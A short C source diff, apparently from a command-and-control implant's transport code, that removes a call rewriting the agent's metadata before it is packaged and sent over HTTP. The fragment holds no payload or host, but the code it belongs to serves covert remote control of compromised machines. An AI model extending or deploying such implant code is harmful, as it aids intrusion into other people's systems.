@@ -19,8 +19,6 @@ BOOL TransportInit( )
 
     /* Sends to our connection (direct/pivot) */
 #ifdef TRANSPORT_HTTP
-    /* Our config can change, so let's write the metadata again just in case */
-    DemonMetaData( &Instance.MetaData, TRUE );
     if ( PackageTransmit( Instance.MetaData, &Data, &Size ) )
     {
         AESCTX AesCtx = { 0 };
